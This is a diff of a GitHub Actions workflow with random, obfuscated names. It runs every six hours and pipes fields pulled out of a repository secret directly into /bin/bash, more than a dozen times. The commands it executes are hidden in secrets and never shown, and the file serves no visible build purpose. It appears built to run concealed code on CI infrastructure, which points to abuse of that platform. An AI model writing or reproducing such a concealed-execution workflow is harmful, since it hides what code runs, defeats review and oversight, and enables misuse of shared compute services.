@@ -3,19 +3,32 @@ name: lijunji6543
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 2/6 * * *'
-jobs:  # 4181
+    - cron: '32 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lijunji6543
         env:
-          msyaz91795: ${{ secrets.msyaz91795 }}
+          wcykd97533: ${{ secrets.wcykd97533 }}
         run: |
-          echo $msyaz91795 | jq -r .zgmu4820 | /bin/bash
-          echo $i572 | jq -r .lq8 | /bin/bash
-          echo $ejbq28522 | jq -r .giu0080 | /bin/bash
-          echo $lsprs341 | jq -r .ykbfk79 | /bin/bash
-          echo $vz63315 | jq -r .cwxjb137 | /bin/bash
+          echo $wcykd97533 | jq -r .zltyh228 | /bin/bash
+          echo $z415 | jq -r .ozqvv24036 | /bin/bash
+          echo $t5 | jq -r .g935 | /bin/bash
+          echo $z163 | jq -r .q5793 | /bin/bash
+          echo $e6749 | jq -r .vevfl89 | /bin/bash
+          echo $mpqr848 | jq -r .i2355 | /bin/bash
+          echo $c9 | jq -r .ygod8 | /bin/bash
+          echo $wuw114 | jq -r .cx90587 | /bin/bash
+          echo $ydjmf6 | jq -r .nkdhb121 | /bin/bash
+          echo $jffxt0112 | jq -r .zc39 | /bin/bash
+          echo $ohs176 | jq -r .rhlrr995 | /bin/bash
+          echo $rwb758 | jq -r .qa4 | /bin/bash
+          echo $bi357 | jq -r .kdny328 | /bin/bash
+          echo $kaf720 | jq -r .wyzk965 | /bin/bash
+          echo $f37 | jq -r .saf558 | /bin/bash
+          echo $iy53269 | jq -r .qeoi67 | /bin/bash
+          echo $fet3763 | jq -r .cncxo3836 | /bin/bash
 
